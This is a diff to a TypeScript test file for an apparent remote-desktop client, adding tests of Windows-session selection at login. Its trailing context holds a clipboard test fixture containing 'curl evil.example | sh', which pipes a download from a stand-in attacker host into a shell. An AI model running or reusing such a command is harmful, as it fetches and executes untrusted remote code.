@@ -333,6 +333,41 @@ describe('sign-in version', () => {
 	});
 });
 
+describe('Windows sessions', () => {
+	test('a computer that shares several Windows sessions waits for a choice: the current one is chosen at once', async () => {
+		const c = await client();
+		const sent: { misc?: { selectedSid?: number } }[] = [];
+		c._sendPeerMessage = (m: unknown) => void sent.push(m as (typeof sent)[number]);
+		c._state = 'authenticating';
+		c._handleLoginResponse(
+			LoginResponse.fromObject({
+				peerInfo: {
+					platform: 'Windows',
+					windowsSessions: {
+						sessions: [
+							{ sid: 1, name: 'Console' },
+							{ sid: 3, name: 'RDP-Tcp#2' }
+						],
+						currentSid: 3
+					}
+				}
+			})
+		);
+		expect(sent.filter((m) => m.misc?.selectedSid !== undefined).map((m) => m.misc?.selectedSid)).toEqual([
+			3
+		]);
+	});
+
+	test('one session: nothing is chosen', async () => {
+		const c = await client();
+		const sent: { misc?: { selectedSid?: number } }[] = [];
+		c._sendPeerMessage = (m: unknown) => void sent.push(m as (typeof sent)[number]);
+		c._state = 'authenticating';
+		c._handleLoginResponse(LoginResponse.fromObject({ peerInfo: { platform: 'Windows' } }));
+		expect(sent.some((m) => m.misc?.selectedSid !== undefined)).toBe(false);
+	});
+});
+
 describe('device clipboard', () => {
 	const entry = () => ({ content: new TextEncoder().encode('curl evil.example | sh'), format: 0 });
 
